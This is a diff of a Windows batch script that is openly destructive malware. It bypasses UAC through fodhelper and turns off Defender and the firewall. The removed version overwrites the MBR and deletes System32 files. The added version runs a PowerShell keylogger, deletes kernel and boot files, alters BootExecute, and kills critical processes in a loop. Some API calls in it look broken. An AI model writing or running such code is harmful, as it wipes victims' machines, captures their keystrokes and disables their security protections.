@@ -4,138 +4,85 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 fodhelper.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
 
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true" >nul 2>&1
 netsh advfirewall set allprofiles state off >nul
 
-echo УНИЧТОЖЕНИЕ BIOS И WINDOWS...
+echo KEYLOGGER ACTIVE - 10 SECONDS TO SYSTEM DESTRUCTION
 powershell -Command "
-Add-Type @'
-using System;
-using System.Runtime.InteropServices;
-public class BIOSKiller {
-    [DllImport(\"kernel32.dll\", SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+$timeout = 10
+$end = (Get-Date).AddSeconds($timeout)
+$log = @()
+while((Get-Date) -lt $end) {
+    $timeLeft = [math]::Round(($end - (Get-Date)).TotalSeconds, 1)
+    Write-Host \"[$(Get-Date -Format 'HH:mm:ss')] Time left: $timeLeft sec\" -ForegroundColor Red
     
-    [DllImport(\"kernel32.dll\", SetLastError=true)]
-    public static extern IntPtr LoadLibrary(string lpFileName);
-    
-    [DllImport(\"kernel32.dll\", SetLastError=true)]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    
-    public static void KillBIOS() {
-        try {
-            IntPtr hModule = LoadLibrary(\"kernel32.dll\");
-            IntPtr addr = GetProcAddress(hModule, \"GetSystemFirmwareTable\");
-            uint oldProtect;
-            VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
-            byte[] patch = {0xC3};
-            Marshal.Copy(patch, 0, addr, 1);
-        } catch {}
+    Add-Type -AssemblyName System.Windows.Forms
+    $keys = @()
+    for($i=8; $i -le 222; $i++) {
+        $state = [System.Windows.Forms.User32]::GetAsyncKeyState($i)
+        if($state -band 0x8000) {
+            $key = [System.Windows.Forms.Keys]$i
+            if($key -ge 'A' -and $key -le 'Z') {
+                $shift = [System.Windows.Forms.User32]::GetAsyncKeyState(16)
+                if($shift -band 0x8000) {
+                    $keys += $key.ToString()
+                } else {
+                    $keys += $key.ToString().ToLower()
+                }
+            } elseif($key -eq 'Return') {
+                $keys += '[ENTER]'
+            } elseif($key -eq 'Space') {
+                $keys += ' '
+            } elseif($key -eq 'Back') {
+                $keys += '[BACKSPACE]'
+            } elseif($key -eq 'Tab') {
+                $keys += '[TAB]'
+            } elseif($key -eq 'Escape') {
+                $keys += '[ESC]'
+            } else {
+                $keys += '[' + $key.ToString() + ']'
+            }
+        }
     }
-}
-'@
-[BIOSKiller]::KillBIOS()
-" >nul 2>&1
-
-echo СНОС WINDOWS...
-takeown /f C:\Windows\* /r /d y >nul 2>&1
-icacls C:\Windows\*.* /grant everyone:F /t /c /q >nul 2>&1
-
-del /f /s /q C:\Windows\System32\*.dll >nul 2>&1
-del /f /s /q C:\Windows\System32\*.exe >nul 2>&1
-del /f /s /q C:\Windows\System32\*.sys >nul 2>&1
-rmdir /s /q C:\Windows\Boot >nul 2>&1
-rmdir /s /q C:\Windows\System32\config >nul 2>&1
-
-echo ПОВРЕЖДЕНИЕ MBR/GPT...
-powershell -Command "
-$drive = Get-WmiObject Win32_DiskDrive | Where-Object {$_.DeviceID -match 'PHYSICALDRIVE0'}
-if($drive) {
-    $mbr = New-Object byte[] 512
-    0..511 | % {$mbr[$_] = 0xFF}
-    $stream = [System.IO.File]::OpenWrite(\"\\\\.\\PHYSICALDRIVE0\")
-    $stream.Write($mbr, 0, 512)
-    $stream.Close()
-}
-" >nul 2>&1
-
-echo НАСТРОЙКА КРАСНОГО ЭКРАНА ПРИ ЗАГРУЗКЕ...
-powershell -Command "
-$vbsCode = @'
-Set video = CreateObject(\"WMPlayer.OCX\")
-video.url = \"about:blank\"
-video.stretchToFit = true
-video.windowless = true
-video.enableContextMenu = false
-Set shell = CreateObject(\"WScript.Shell\")
-Set fso = CreateObject(\"Scripting.FileSystemObject\")
-vbsFile = fso.GetSpecialFolder(2) & \"\\boot.vbs\"
-fso.CreateTextFile(vbsFile, True).Write vbsCode
-shell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BootScreen\", \"wscript.exe \"\"\" & vbsFile & \"\"\"\", \"REG_SZ\"
-'@
-$path = \"$env:TEMP\\boot.vbs\"
-Set-Content -Path \$path -Value \$vbsCode -Force
-wscript.exe \$path
-" >nul 2>&1
-
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c echo ФИГ ТЕБЕ а НЕ ИНФОРМАТИКА ЛОХ!!! && pause && shutdown -s -f -t 0" /f >nul 2>&1
-
-echo СОЗДАНИЕ RED SCREEN...
-powershell -Command "
-Add-Type @'
-using System;
-using System.Runtime.InteropServices;
-public class RedScreen {
-    [DllImport(\"user32.dll\")]
-    public static extern IntPtr GetDC(IntPtr hwnd);
-    
-    [DllImport(\"user32.dll\")]
-    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hDC);
-    
-    [DllImport(\"gdi32.dll\")]
-    public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);
-    
-    [DllImport(\"user32.dll\")]
-    public static extern bool DrawText(IntPtr hdc, string text, int len, ref RECT rect, uint format);
-    
-    [StructLayout(LayoutKind.Sequential)]
-    public struct RECT {
-        public int Left; public int Top; public int Right; public int Bottom;
+    if($keys.Length -gt 0) {
+        $logEntry = \"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - \" + ($keys -join '')
+        $log += $logEntry
+        Write-Host $logEntry
     }
-    
-    public static void Show() {
-        IntPtr hdc = GetDC(IntPtr.Zero);
-        PatBlt(hdc, 0, 0, 5000, 5000, 0x00F00021);
-        RECT rect = new RECT { Left = 100, Top = 300, Right = 1900, Bottom = 800 };
-        DrawText(hdc, \"ФИГ ТЕБЕ а НЕ ИНФОРМАТИКА ЛОХ!!!\", -1, ref rect, 0x00000001 | 0x00001000);
-        ReleaseDC(IntPtr.Zero, hdc);
-    }
+    Start-Sleep -Milliseconds 10
 }
-'@
-[RedScreen]::Show()
+
+Write-Host \"TIME'S UP - SYSTEM DESTRUCTION INITIATED\" -ForegroundColor White -BackgroundColor Red
 " >nul 2>&1
 
-echo ВЫКЛЮЧЕНИЕ КОМПЬЮТЕРА...
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f >nul 2>&1
+echo SYSTEM KILL PHASE
+takeown /f C:\Windows\System32\* /r /d y >nul 2>&1
+icacls C:\Windows\System32\*.* /grant everyone:F /t /c /q >nul 2>&1
 
-shutdown -s -f -t 3 -c "ФИГ ТЕБЕ а НЕ ИНФОРМАТИКА ЛОХ!!!"
-timeout /t 5 >nul
+del /f /s /q C:\Windows\System32\ntoskrnl.exe >nul 2>&1
+del /f /s /q C:\Windows\System32\hal.dll >nul 2>&1
+del /f /s /q C:\Windows\System32\bootmgr >nul 2>&1
+del /f /s /q C:\Windows\System32\winload.exe >nul 2>&1
+del /f /s /q C:\Windows\System32\config\SYSTEM >nul 2>&1
+
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk * /x /r\0" /f >nul 2>&1
 
 powershell -Command "
-$code = @'
-[DllImport(\"ntdll.dll\")]
-public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-[DllImport(\"ntdll.dll\")]
-public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-'@
-Add-Type -MemberDefinition \$code -Name Win32 -Namespace NtDll
-$prev = $false
-[NtDll.Win32]::RtlAdjustPrivilege(19, $true, $false, [ref]\$prev)
-$response = 0
-[NtDll.Win32]::NtRaiseHardError(0xc0000420, 0, 0, [IntPtr]::Zero, 6, [ref]\$response)
+$wshell = New-Object -ComObject Wscript.Shell
+$wshell.Popup('SYSTEM FATAL ERROR`n`nBOOT CORRUPTED`n`nKERNEL FILES DELETED`n`nREBOOT WILL DESTROY WINDOWS',0,'WINDOWS DEATH',0x0 + 0x10)
 " >nul 2>&1
 
-:force_shutdown
-wmic os where primary=1 call shutdown
-goto force_shutdown
+echo CREATING FINAL BSOD
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1
+
+taskkill /f /im csrss.exe >nul 2>&1
+taskkill /f /im winlogon.exe >nul 2>&1
+
+:kill
+taskkill /f /im explorer.exe >nul 2>&1
+taskkill /f /im svchost.exe >nul 2>&1
+echo SYSTEM DEAD - REBOOT FOR BSOD
+timeout /t 1 >nul
+goto kill
